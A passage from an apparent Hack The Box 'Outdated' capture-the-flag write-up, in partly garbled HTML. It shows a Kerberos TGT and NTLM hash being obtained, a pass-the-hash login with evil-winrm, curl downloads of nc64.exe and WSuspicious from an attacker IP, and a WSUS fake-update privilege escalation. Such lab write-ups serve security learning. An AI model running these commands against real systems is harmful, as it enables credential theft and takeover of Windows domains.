font-style: inherit;">"qUOOiC6IHD1YbErH"</span> /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</span>
<span id="cb15-3"></span>
<span id="cb15-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Action: Ask TGT</span>
<span id="cb15-5"></span>
<span id="cb15-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Using PKINIT with etype rc4_hmac and subject: CN=sflowers </span>
<span id="cb15-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Building AS-REQ <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">w/</span> PKINIT preauth<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">for:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'outdated.htb\sflowers'</span></span>
<span id="cb15-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> TGT request successful!</span>
<span id="cb15-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> base64<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ticket.kirbi</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb15-10"></span>
<span id="cb15-11">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g</span></span>
<span id="cb15-12">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">AwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRio4IEnzCCBJugAwIBEqEDAgECooIEjQSCBIkNOdmX</span></span>
<span id="cb15-13">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jSa0Ei9bzfsFcCPd5PWKYpJt9enLuWJ4ee92679C60JShPZl4Tp4rwDD5Qdkp5zBDtfY55HnFbriJ1V1</span></span>
<span id="cb15-14">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Xd4pZQxLZB81U6gNw42X3Gd/Rj1P5C4neIQVlcFZ1uQeNUkfLLi58QIXj7LJODxWNgLgEpW0cxPBJzOd</span></span>
<span id="cb15-15">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gnr9sbLbYb1ubrRf3+nQeF/oQ/NwxojSF6ynmdtrdN2VAd862nSiP2tPXnI4w+z+j5gE7RR50AXpqvBY</span></span>
<span id="cb15-16">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6PQdroHP4aifoUptpVvQdwxwVteEm6mRGoD5usa02JExzjoiRnXVhp385iP3XUaskTFFvEhv50PlqvG8</span></span>
<span id="cb15-17">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SD7RUaFWLjzAkuB7AxxLl8zG5v6EX2A7MmcacFXtjOnEdR5MZutmdyMUX5T/N0V2EHHgyge+6RDASX8o</span></span>
<span id="cb15-18">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1xWjl2khzpPATjg8J0HAtJ6o3eLO+S8Hm+JmJ6iEUkxcQViP1tXcnT5s1N/H73IR0uV+X4dV0V6zC5D5</span></span>
<span id="cb15-19">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">p3vt/jDw6l0A8U+OBw2zaqvY0pBbTUsFNouQKayGzXnhBNIGg91INZGaRKE0XZ/kHrupEZZ4BhxFIb+T</span></span>
<span id="cb15-20">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">zgzKY4a6V5dgHpgyYgg+El9KNkjE+1hceuZximsgs6exO+QCcHeZ1szGaKnyJdMQo5oWYZiAR8versPg</span></span>
<span id="cb15-21">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">qpVG+UlTe6UZ1jaRspBNWpvamJbTNgFEXCaZRdJUheNPSfcqwWE8FdYmPaY8WN1i1hIynTXbxxgjilvC</span></span>
<span id="cb15-22">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LdsKrhGLW+9A4YszQqpTkP4+HngQzdGiFbEAqMjmR+Ryyn6CejjQEMMPPZzu+xu/UItB88Nu/jLMogdS</span></span>
<span id="cb15-23">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DMNWT+uPN0knpIWfyNIX/eAzqOOkl7QxuVeS3CuqqzmbwNn+6M2Xhtd9n33BFvXjU6EqLNzqMBA8CPh1</span></span>
<span id="cb15-24">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">qqsK5zcAvgi0OQPm1cNu0cU53g6wgYbXQBtUwfmPD7fAZw4d/CpY23ak6xVf1NCyaPGwAYJ/9Tb/bUs2</span></span>
<span id="cb15-25">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9Ul/NjqfoxV7NoqMkHfJlzt0sG9oM6TEiBGl6kMpLR0wpLw5sySFJq/zb72pOdtir+5j4OYqTHK8C50q</span></span>
<span id="cb15-26">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NDf/Tj4+6/tlHM/EyCeM9043KDEktRVmS+v4h5Jc3sjtKu7DR7NRT85KevlYLCNxGO8iPk0Y/A4bx/lW</span></span>
<span id="cb15-27">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ajqae/Kopf3g0ceXYZeMEZPpK1bfX276yn+/nun2FmIO2InWKVHNKU3YwMlfpmgRLKFovTJ9S5Cc6kti</span></span>
<span id="cb15-28">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6tFhZrP3JAV7HCCQumGr2k6vd48s5GTRxK5KDg7oKEA8LGfFzrPwWeJx+dCnAoOrQ73rGa0wdEPyTGHA</span></span>
<span id="cb15-29">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RtkkjSlOtwjWBnudAOnQqm4FSC3yficJOdFS+4sYF6ZgM/m8P1hlRAzGXcZt6eOjlpezGPN8PsuF8SlZ</span></span>
<span id="cb15-30">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">n4wyjkCE9IlRBhgI4bGb7ui4sndIJ9f9GwdOgx0jVM/Dyi8fNYSeoUDji/4FNZdDW6aMypo1VcbVzzHn</span></span>
<span id="cb15-31">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Y/ccRLtYnXj5kamVeJcuG9PtP4p82kLvwEeyFZMVF/lZMpu5tVFMXoMTs7IhwLl3yLqksZhvTo8uttgj</span></span>
<span id="cb15-32">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">soF/RfbeO36TOGWsRgB3S6ajgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaAbMBmgAwIBF6ES</span></span>
<span id="cb15-33">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">BBDp4wnEUrmAGjaGXv4XqiJZoQ4bDE9VVERBVEVELkhUQqIVMBOgAwIBAaEMMAobCHNmbG93ZXJzowcD</span></span>
<span id="cb15-34">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">BQBA4QAApREYDzIwMjIwODE5MTkzMjI3WqYRGA8yMDIyMDgyMDA1MzIyN1qnERgPMjAyMjA4MjYxOTMy</span></span>
<span id="cb15-35">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MjdaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi</span></span>
<span id="cb15-36"></span>
<span id="cb15-37">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ServiceName</span>              :  krbtgt/outdated.htb</span>
<span id="cb15-38">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ServiceRealm</span>             :  OUTDATED.HTB</span>
<span id="cb15-39">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UserName</span>                 :  sflowers</span>
<span id="cb15-40">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UserRealm</span>                :  OUTDATED.HTB</span>
<span id="cb15-41">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">StartTime</span>                :  8/19/2022 12:32:27 PM</span>
<span id="cb15-42">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EndTime</span>                  :  8/19/2022 10:32:27 PM</span>
<span id="cb15-43">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RenewTill</span>                :  8/26/2022 12:32:27 PM</span>
<span id="cb15-44">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Flags</span>                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span>
<span id="cb15-45">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">KeyType</span>                  :  rc4_hmac</span>
<span id="cb15-46">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Base64</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">key</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>              <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span>  6eMJxFK5gBo2hl7+F6oiWQ==</span>
<span id="cb15-47">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ASREP</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">key</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>              <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span>  C930BD99144FF387606300042A2D9F52</span>
<span id="cb15-48"></span>
<span id="cb15-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Getting credentials using U2U</span>
<span id="cb15-50"></span>
<span id="cb15-51">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CredentialInfo</span>         :</span>
<span id="cb15-52">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Version</span>              : 0</span>
<span id="cb15-53">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EncryptionType</span>       : rc4_hmac</span>
<span id="cb15-54">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CredentialData</span>       :</span>
<span id="cb15-55">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CredentialCount</span>    : 1</span>
<span id="cb15-56">       <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NTLM</span>              : 1FCDB1F6015DCB318CC77BB2BDA14DB5</span></code></pre></div>
<p>We get a TGT and at the bottom we find the NTLM hash for <code>sflowers</code>, use <code>evil-winrm</code> and pass-the-hash:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated evil-winrm <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> outdated.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> sflowers <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> 1FCDB1F6015DCB318CC77BB2BDA14DB5</span>
<span id="cb16-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*Evil-WinRM*</span> PS C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\s</span>flowers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>esktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> type user.txt</span>
<span id="cb16-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0190f8bd21ac78cd004055a7eb6bafb8</span></span></code></pre></div>
<table class="caption-top table">
<colgroup>
<col style="width: 100%">
</colgroup>
<tbody>
<tr class="odd">
<td style="text-align: left;"># Root ### Step 1 Lets start by doing some quick manual enumeration.</td>
</tr>
<tr class="even">
<td style="text-align: left;">```powershell <em>Evil-WinRM</em> PS C:&gt; whoami /all</td>
</tr>
<tr class="odd">
<td style="text-align: left;">USER INFORMATION</td>
</tr>
</tbody>
</table>
<p>User Name SID ================= ============================================ outdatedS-1-5-21-4089647348-67660539-4016542185-1108</p>
</section>
<section id="group-information" class="level2">
<h2 class="anchored" data-anchor-id="group-information">GROUP INFORMATION</h2>
<p>Group Name Type SID Attributes =========================================== ================ ============================================ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTINManagement Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTINAlias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTINService DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITYWell-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITYUsers Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITYOrganization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group OUTDATEDAdministrators Alias S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITYAuthentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory LabelPlus Mandatory Level Label S-1-16-8448</p>
</section>
<section id="privileges-information" class="level2">
<h2 class="anchored" data-anchor-id="privileges-information">PRIVILEGES INFORMATION</h2>
<p>Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</p>
<pre><code>
We're part of the group `WSUS Administrators` which is interestings, if WSUS is the privesc vector it would surely match the box name Outdated, lets dig deeper here.

Reading about compromising WSUS I find:
&gt;_"You can compromise the system if the updates are not requested using http**S** but http . And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to `1`, the it is exploitable."_

```powershell
*Evil-WinRM* PS C:\WSUS\WsusContent&gt; reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    http://wsus.outdated.htb:8530

*Evil-WinRM* PS C:\WSUS\WsusContent&gt; reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
    UseWUServer    REG_DWORD    0x1</code></pre>
<p>Both requirements are met! To exploit we can use tools such as <a href="https://github.com/GoSecure/WSuspicious">WSuspicious</a>, <a href="https://github.com/pimps/wsuxploit">Wsuxploit</a> or <a href="https://github.com/GoSecure/pywsus">pyWSUS</a>, which are MiTM exploit scripts to inject fake updates into non-SSL WSUS traffic.</p>
<p>Trying to compile WSuspicious I’m missing the packages <code>ILMerge</code> and <code>Titanium.Web.Proxy</code>, add nuget package source and update to match all requirements.</p>
<p><strong>NOTE:</strong> This tool will lead to a dead-end and later (Step 3) I will find another tool that works</p>
<p><img src="https://exploit.se/posts/2022-08-22-htb-writeup-outdated/images/outdated03.png" class="img-fluid"></p>
<p>Compile the project and transfer the binary to Kali attacking machine.</p>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Upload the binaries needed for the attack:</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb18-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">curl</span> http<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">://</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.4</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>nc64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>o C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks\nc64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span></span>
<span id="cb18-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">curl</span> http<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">://</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.4</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>WSuspicious<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>o C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks\WSuspicious<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span></span></code></pre></div>
<p>Running WSuspicious we get the and error that <code>PsExec64.exe</code> is not found:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb19-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>\ws<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>command<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" - accepteula - s - d cmd / c 'echo test &gt; C:\Windows\Tasks\wsuspicious.txt'"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>autoinstall</span>
<span id="cb19-2">Detected WSUS Server <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> wsus<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">outdated</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span></span>
<span id="cb19-3">ws<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> </span>
<span id="cb19-4">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> CategoryInfo          <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> NotSpecified<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(:</span>String<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[],</span> RemoteException</span>
<span id="cb19-5">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> FullyQualifiedErrorId <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> NativeCommandError</span>
<span id="cb19-6">Unhandled Exception<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> System<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">IO</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">FileNotFoundException</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> Could not find file <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'C:\Windows\Tasks\PsExec64.exe'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span></span></code></pre></div>
<p>Uploading the needed binary and try again:</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb20-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>\WSuspicious<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>command<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" - accepteula - s - d cmd / c 'echo test &gt; C:\Windows\Tasks\wsuspicious.txt'"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>autoinstall</span>
<span id="cb20-2">Detected WSUS Server <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> wsus<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">outdated</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span></span>
<span id="cb20-3">Listening on <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ExplicitProxyEndPoint'</span> endpoint at Ip <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">127.0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.1</span> and port<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">13337</span></span>
<span id="cb20-4"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Hit</span> any key to <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">exit</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">..</span></span>
<span id="cb20-5"></span>
<span id="cb20-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span></span>
<span id="cb20-7">Mode                LastWriteTime         Length Name</span>
<span id="cb20-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------</span>         <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">------</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span></span>
<span id="cb20-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">22</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>   <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">7</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">55</span> AM          <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">45272</span> nc64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span></span>
<span id="cb20-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----         <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">3</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>   <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span> PM         <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">514472</span> PsExec64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span></span>
<span id="cb20-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">22</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>  <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">12</span> AM           <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2666</span> rootCert<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">pfx</span></span>
<span id="cb20-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">22</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>  <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span> AM        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4548096</span> WSuspicious<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span></span></code></pre></div>
<p>The server dies immediately and the test-file is not present, something is weird. Testing around I managed to get the server working propperly by setting up a new reverse connection:</p>
